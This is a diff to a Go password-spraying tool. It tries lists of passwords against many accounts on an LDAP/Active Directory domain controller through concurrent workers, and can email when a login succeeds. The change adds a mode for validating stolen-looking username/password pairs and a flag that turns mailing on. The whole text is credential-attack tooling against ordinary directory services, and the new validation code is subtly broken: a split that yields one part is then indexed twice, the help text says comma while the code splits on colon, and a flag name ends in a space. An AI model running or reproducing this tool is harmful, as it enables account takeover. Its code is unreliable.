@@ -12,6 +12,7 @@ import (
 	"net"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -22,21 +23,14 @@ import (
 type configuration struct {
 	accountsfile     string
 	passwordfile     string
+	validationfile   string
 	domainController string
 	verbose          bool
 	dcCertificate    string
 	tlsConfig        *tls.Config
 	logfile          string
 	maxWorkers       int
-}
-
-type mailConfig struct {
-	smtpServer   string
-	smtpPort     int
-	smtpAccount  string
-	smtpPassword string
-	mailFrom     string
-	mailTo       string
+	sendmail         bool
 }
 
 type message struct {
@@ -87,18 +81,14 @@ func main() {
 	config := configuration{}
 	flag.StringVar(&config.accountsfile, "accounts", "accounts.list", "Filename of the accounts to test. One account name per line.")
 	flag.StringVar(&config.passwordfile, "passwords", "passwords.list", "Password file, one password per line.")
+	flag.StringVar(&config.validationfile, "validatecreds", "", "Validation mode - single file with username,password to valdiate")
 	flag.StringVar(&config.domainController, "dc", "ldaps://<yourdomain>.<corp>.<com>", "URL to your LDAP Server")
 	flag.BoolVar(&config.verbose, "verbose", true, "Verbose errors")
 	flag.StringVar(&config.dcCertificate, "dccert", "", "Public key from Domain Controller. To safely use TLS from non domain machine")
 	flag.StringVar(&config.logfile, "logfile", "results.log", "Log file containing results and output")
 	flag.IntVar(&config.maxWorkers, "workers", 2, "Number of concurrent worker routines")
+	flag.BoolVar(&config.sendmail, "sendmail ", false, "Send mail when successful authentication happens (requires configuration)")
 	flag.Parse()
-
-	//mail configuraiton settings
-	//TODO: move this into a config file
-	mc := mailConfig{
-		"smtp-mail.outlook.com",
-		587, "", "", "", ""} //TODO: configure these for your mail account
 
 	//setup logging
 	logfile, err := os.OpenFile(config.logfile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
@@ -116,10 +106,12 @@ func main() {
 	log.Println("=========================")
 	log.Println("Accounts File    : " + config.accountsfile)
 	log.Println("Passwords File   : " + config.passwordfile)
+	log.Println("Validation File  : " + config.validationfile)
 	log.Println("Domain Controller: " + config.domainController)
 	//log.Println("Verbose Output:    " + config.verbose)
-	log.Println("Domain CA: " + config.dcCertificate)
-	log.Println("Workers" + strconv.Itoa(config.maxWorkers))
+	log.Println("Domain CA        : " + config.dcCertificate)
+	log.Println("Workers          : " + strconv.Itoa(config.maxWorkers))
+	log.Println("Sending Emails   : " + strconv.FormatBool(config.sendmail))
 	log.Println()
 
 	//Custom DC certificate to load?
@@ -140,12 +132,11 @@ func main() {
 
 	log.Println("TLS configuration complete.")
 
-	log.Println("Reading Input Files for account names and passwords.")
-	accounts := readFile(config.accountsfile)
-	passwords := readFile(config.passwordfile)
+	//TODO: configure these for your mail account, by default sending mail is disabled
+	mailutil.SetConfiguration("smtp-mail.outlook.com", 587, "", "accountpassword", "from", "to", config.sendmail)
 
-	log.Println("Configuring mail.")
-	mailutil.SetConfiguration(mc.smtpServer, mc.smtpPort, mc.smtpAccount, mc.smtpPassword, mc.mailFrom, mc.mailTo)
+	log.Print("Press ENTER to start test execution. ")
+	bufio.NewReader(os.Stdin).ReadString('\n')
 
 	log.Println("Starting.")
 
@@ -157,23 +148,55 @@ func main() {
 		go validate(&wg, workchannel, config)
 	}
 
-	for idxPwd, password := range passwords {
+	//decide between validation mode and password spray mode here
+	if config.validationfile != "" {
+		log.Printf("Validation Mode. Will test the provided credentials file (csv format).")
+		lines := readFile(config.validationfile)
 
-		log.Println("***************** NEW ROUND")
-		mailutil.SendMail("New Round!", "Good luck! :)")
+		log.Println("***************** VALIDATION STARTING")
+		mailutil.SendMail("Credential Validation Starting", "Good luck! :)")
 
-		for idxAccount, account := range accounts {
-			var refID = strconv.Itoa(idxPwd) + "-" + strconv.Itoa(idxAccount)
+		for idxLine, line := range lines {
+			parts := strings.SplitN(line, ":", 1)
+			account := parts[0]
+			password := parts[1]
 
+			refID := strconv.Itoa(idxLine)
 			cred := credential{refID, account, password}
+
 			m := message{false, cred}
 
 			workchannel <- m
-		}
 
-		//rest a bit after each round
-		time.Sleep(10 * time.Second)
+			//rest a little after each test
+			time.Sleep(10 * time.Millisecond)
+		}
+	} else {
+		//Spray Mode
+		log.Println("Reading Input Files for account names and passwords.")
+		accounts := readFile(config.accountsfile)
+		passwords := readFile(config.passwordfile)
+
+		for idxPwd, password := range passwords {
+
+			log.Println("***************** NEW ROUND")
+			mailutil.SendMail("New Round!", "Good luck! :)")
+
+			for idxAccount, account := range accounts {
+				var refID = strconv.Itoa(idxPwd) + "-" + strconv.Itoa(idxAccount)
+
+				cred := credential{refID, account, password}
+				m := message{false, cred}
+
+				workchannel <- m
+			}
+
+			//rest a bit after each round
+			time.Sleep(10 * time.Second)
+		}
 	}
+
+	log.Printf("Approaching end of test space...")
 
 	//cleanup
 	for i := 0; i < config.maxWorkers; i++ {
@@ -181,6 +204,8 @@ func main() {
 		workchannel <- m
 	}
 
+	log.Printf("Wrapping up.")
+	wg.Wait()
 	log.Printf("Done.")
 }
 
